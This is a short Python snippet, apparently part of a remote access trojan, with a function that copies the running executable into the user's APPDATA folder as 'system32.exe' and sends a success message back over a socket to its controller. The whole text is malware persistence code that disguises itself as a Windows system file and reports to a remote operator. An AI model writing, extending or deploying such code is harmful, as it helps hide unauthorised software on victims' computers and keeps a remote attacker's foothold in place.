import sys
import shutil
import os


def become_persistant(my_socket):
    print("[+] Becoming persistant")

    curr_exe = sys.executable

    print(curr_exe)
    app_data = os.getenv('APPDATA')
    print(app_data)
    shutil.copyfile(curr_exe, app_data+"\\"+"system32.exe")
    my_socket.send_data("[+] Successfully become persistant")


